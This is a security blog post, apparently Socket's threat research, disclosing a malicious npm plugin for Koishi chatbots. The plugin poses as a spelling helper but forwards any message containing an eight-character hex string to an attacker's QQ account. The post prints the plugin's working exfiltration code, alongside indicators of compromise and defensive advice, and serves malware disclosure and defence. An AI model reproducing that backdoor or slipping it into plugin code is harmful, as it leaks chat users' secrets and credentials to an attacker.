---
title: "Malicious Koishi Chatbot Plugin Exfiltrates Messages Triggered by 8-Character Hex Strings"
short_title: "Malicious Koishi Chatbot Plugin Exfiltrates Messages"
date: 2025-05-19 12:00:00 +0000
categories: [Malware, npm]
tags: [npm, JavaScript, T1195.002, T1059.007, T1078, T1567]
canonical_url: https://socket.dev/blog/malicious-koishi-chatbot-plugin
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/fca4defa5990157f7a6a8623ee7c6b250e00adf3-1024x1024.webp
  alt: "Malicious Koishi Chatbot Plugin Exfiltrates Messages Triggered by 8-Character Hex Strings"
description: "Malicious Koishi plugin silently exfiltrates messages with hex strings to a hardcoded QQ account, exposing secrets in chatbots across platforms."
---

Socket's Threat Research Team discovered a malicious npm package [`koishi‑plugin‑pinhaofa`](https://socket.dev/npm/package/koishi-plugin-pinhaofa) that plants a data‑exfiltration backdoor in Koishi chatbots. Marketed as a spelling‑autocorrect helper, the plugin scans every message for an eight‑character hexadecimal string. When it finds one, it forwards the full message, potentially including any embedded secrets or credentials, to a hardcoded QQ account.

![Socket AI Scanner flags koishi-plugin-pinhaofa](https://cdn.sanity.io/images/cgdhsj6q/production/13e4f6a599da521f529861d4ee0906f34c9d3bcb-2048x817.png)
_Socket's AI Scanner flags `koishi‑plugin‑pinhaofa` as "Known malware"._

## Chatbots Are on the Rise

Chatbots have become a major channel for customer engagement. eMarketer [predicts](https://www.emarketer.com/learningcenter/guides/chatbot-market-stats-trends/?utm_source=chatgpt.com) that by 2026 one in three U.S. adults will rely on banking chatbots. Koishi [supports](https://koishi.chat/en-US/) this growth with a TypeScript framework that lets developers run the same bot on QQ, Telegram, Discord, and other platforms from a single codebase. Its marketplace offers more than one thousand community plugins. Each plugin runs inside the bot process, giving it unrestricted access to read or modify every message.

![Key e-commerce chatbot functions](https://cdn.sanity.io/images/cgdhsj6q/production/09ffe9d4970f2213e2b55c65e9c2cf717f1d60aa-2048x1077.png)
_Examples of key e‑commerce chatbot functions (Source: [Botpress](https://botpress.com/blog/conversational-ai-for-e-commerce))._

## One Over the Eight

According to Wikipedia, 8 (eight) is the number following 7 and preceding 9. It also features in the breathtaking thriller, "Why was 6 afraid of 7? Because 7, 8, 9". In Chinese and several other Asian cultures, eight symbolizes good luck. Reflecting that belief, the Beijing Summer Olympics began on 08/08/08 at precisely 8:08:08 p.m.

In `koishi‑plugin‑pinhaofa` the threat actor relies on an 8 (eight) character hexadecimal trigger. When the plugin sees such a string anywhere in a message, it immediately forwards the entire text to a hardcoded QQ account. Eight character hex often represent short Git commit hashes, truncated JWT or API tokens, CRC‑32 checksums, GUID lead segments, or device serial numbers, each of which can unlock wider systems or map internal assets. By harvesting the whole message the threat actor also scoops up any surrounding secrets, passwords, URLs, credentials, tokens, or IDs. The narrow trigger pulls in these high value artifacts while generating few false positives, keeping the threat actor's inbox relevant and manageable.

![Socket AI Scanner analysis of koishi-plugin-pinhaofa](https://cdn.sanity.io/images/cgdhsj6q/production/613467d315e0da606398a05eec17c60b8f929f92-615x550.png)
_Socket AI Scanner's analysis, including contextual details about the malicious `koishi-plugin-pinhaofa` package._

`koishi‑plugin‑pinhaofa` attaches silently to Koishi's message stream, watches for any eight‑character hexadecimal sequence, and, when it finds one, forwards the full message to QQ UIN `1821181277`. Tencent QQ, also known as QQ, is an instant messaging software service and web portal developed by the Mainland Chinese technology company Tencent.

- Banking assistants might disclose payment card numbers or truncated transaction hashes.
- E‑commerce chats may leak order‑status links that include JWT session tokens or payment‑authorization hashes that trigger the regex, and customer addresses or phone numbers typed alongside order numbers.
- Healthcare bots could expose patient codes, appointment dates, or prescription IDs.

Because Koishi plugins run inside the bot process and are installed directly from npm, the malicious `koishi‑plugin‑pinhaofa` package executes within the bot's trusted runtime. If administrators add plugins without reviewing the code, this malicious package can:

- Exfiltrate sensitive data in real time, no database required
- Blend into ordinary QQ private‑message traffic and avoid detection
- Violate regulatory requirements, prompting GDPR breach notices, HIPAA fines, or PCI penalties.

## Inside the Malicious Package

The package was published by a threat actor using the npm alias `kuminfennel`, with a registration email `1821181277@qq[.]com`, and a matching GitHub account, `1821181277` (`hxxps://github[.]com/1821181277`). The package is still live on the npm registry and the GitHub repository but we have petitioned its removal.

Below are annotated code [snippets](https://socket.dev/npm/package/koishi-plugin-pinhaofa/files/1.0.0/lib/index.js#L33) highlighting a data‑exfiltration functionality in the malicious `koishi‑plugin‑pinhaofa` package.

```javascript
ctx.on("message", (session) => {          // process every incoming message
  const hexRegex = /(^|[^0-9A-Fa-f])([0-9A-Fa-f]{8})([^0-9A-Fa-f]|$)/;
  const content = session.content.replace(" ", "");
  if (hexRegex.test(content)) {           // true if an exact 8‑char hex string exists
    session.bot.sendPrivateMessage(       // exfiltrate complete message text
      "1821181277",                       // threat actor's QQ UIN
      content);
    session.bot.sendPrivateMessage(
      extractAll8DigitHex(content)[0]);
  }
});
```

The threat actor succeeds by exploiting three conditions: Koishi loads every plugin directly inside the bot process, npm provides wide and convenient distribution, and developers often install helper plugins without rigorous review. The backdoor is just a few lines of code, with no obfuscation, extra dependencies, or outbound URL beyond a hardcoded QQ ID. Because the stolen data exits over the same chat protocol the bot normally uses, standard web filters and endpoint defenses may not notice the traffic.

## Outlook and Recommendations

Supply chain attacks against chatbot frameworks will rise as enterprises accelerate conversational chatbot deployments in finance, retail, and healthcare. To reduce the likelihood and impact of an incident, teams should place each bot in a container that can transmit messages only to approved domains or IDs, which blocks covert exfiltration even if a backdoor slips through. To avoid a backdoor compromise in the first place, strengthen the development pipeline with automated tooling: the free [Socket GitHub application](https://socket.dev/features/github) and [CLI](https://socket.dev/features/cli) catch suspect patterns in pull requests and package installations, while the [Socket browser extension](https://socket.dev/features/web-extension) surfaces risk scores during package selection, reducing the chance that a malicious plugin ever lands in your codebase.

## Indicators of Compromise (IOCs)

- Malicious Package: `koishi‑plugin‑pinhaofa`
- QQ Account: `1821181277`
- npm Alias: `kuminfennel`
- npm Registration Email: `1821181277@qq[.]com`
- GitHub Repository: `hxxps://github[.]com/1821181277`

## MITRE ATT&CK

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1059.007 — Command and Scripting Interpreter: JavaScript
- T1078 — Valid Accounts
- T1567 — Exfiltration Over Web Service
